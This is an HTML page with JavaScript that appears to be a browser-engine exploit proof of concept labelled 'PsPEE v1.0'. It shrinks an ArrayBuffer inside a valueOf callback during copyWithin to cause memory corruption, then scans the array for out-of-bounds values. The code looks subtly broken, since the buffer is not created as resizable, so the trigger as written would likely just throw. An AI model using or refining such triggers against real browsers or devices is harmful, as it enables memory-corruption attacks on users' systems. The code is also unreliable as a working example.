<!DOCTYPE html>
<html>
<head>
    <style>
        #output {
            font-family: monospace;
            white-space: pre-wrap;
            background-color: #111;
            color: #0f0;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            width: 100%;
            height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div id="output"></div>
    <script>
        function log(msg) {
            document.getElementById("output").textContent += msg + "\n";
        }

        log("[INFO] PsPEE v1.0 - Running bug...");

        // Setup
        let ab = new ArrayBuffer(0x1000);
        let u8 = new Uint8Array(ab);
        let u32 = new Uint32Array(ab);

        for (let i = 0; i < u8.length; i++) u8[i] = 0x41; // Fill with 'A'

        // Trigger
        function call_back() {
            try {
                ab.resize(0); // This is the bug trigger
                log("[+] Resized buffer inside valueOf");
            } catch (e) {
                log("[!] Resize failed: " + e);
            }
            return 0;
        }

        try {
            u8.copyWithin(0x20, { valueOf: call_back }); // Trigger side effect
            log("[+] copyWithin completed");
        } catch (e) {
            log("[!] copyWithin error: " + e);
        }

        // Scan memory to detect corruption or success
        let found = false;
        for (let i = 0; i < u32.length; i++) {
            if (u32[i] !== 0x41414141) {
                log(`[OOB?] u32[${i}] = 0x${u32[i].toString(16)}`);
                found = true;
            }
        }

        if (!found) {
            log("[!] No memory corruption detected yet.");
        }
    </script>
</body>
</html>
